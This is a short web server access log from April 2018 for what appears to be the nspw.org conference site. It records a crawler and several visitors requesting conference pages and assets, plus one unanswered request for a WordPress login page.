95.216.19.59 - - [25/Apr/2018:11:40:00 -0400] "GET /2017/dates HTTP/1.1" 200 6386 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
188.60.72.17 - - [25/Apr/2018:11:40:01 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
95.216.19.59 - - [25/Apr/2018:11:40:22 -0400] "GET /2017/location HTTP/1.1" 200 6089 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:11:40:44 -0400] "GET /2018 HTTP/1.1" 200 6848 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:11:41:06 -0400] "GET /2018/cfp HTTP/1.1" 200 8098 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
2.91.137.111 - - [25/Apr/2018:11:41:08 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
2.91.137.111 - - [25/Apr/2018:11:41:09 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
95.216.19.59 - - [25/Apr/2018:11:41:28 -0400] "GET /2018/dates HTTP/1.1" 200 6213 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:11:41:50 -0400] "GET /current/ HTTP/1.1" 200 6850 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:11:42:12 -0400] "GET /introduction HTTP/1.1" 200 6549 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:11:42:35 -0400] "GET /node/5 HTTP/1.1" 200 6333 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:11:42:56 -0400] "GET /papers/2012/ HTTP/1.1" 200 6272 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
37.191.152.34 - - [25/Apr/2018:11:43:09 -0400] "GET /2018/cfp HTTP/1.1" 200 8165 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
37.191.152.34 - - [25/Apr/2018:11:43:09 -0400] "GET /misc/jquery.once.js?v=1.2 HTTP/1.1" 200 1445 "https://www.nspw.org/2018/cfp" "Mozilla/5.0 (X11; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
37.191.152.34 - - [25/Apr/2018:11:43:09 -0400] "GET /misc/jquery.js?v=1.4.4 HTTP/1.1" 200 31010 "https://www.nspw.org/2018/cfp" "Mozilla/5.0 (X11; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
37.191.152.34 - - [25/Apr/2018:11:43:09 -0400] "GET /modules/system/system.theme.css?p7kfx6 HTTP/1.1" 200 1585 "https://www.nspw.org/2018/cfp" "Mozilla/5.0 (X11; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
37.191.152.34 - - [25/Apr/2018:11:43:10 -0400] "GET /modules/comment/comment.css?p7kfx6 HTTP/1.1" 200 505 "https://www.nspw.org/2018/cfp" "Mozilla/5.0 (X11; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
37.191.152.34 - - [25/Apr/2018:11:43:10 -0400] "GET /modules/field/theme/field.css?p7kfx6 HTTP/1.1" 200 599 "https://www.nspw.org/2018/cfp" "Mozilla/5.0 (X11; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
37.191.152.34 - - [25/Apr/2018:11:43:10 -0400] "GET /modules/system/system.menus.css?p7kfx6 HTTP/1.1" 200 1182 "https://www.nspw.org/2018/cfp" "Mozilla/5.0 (X11; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
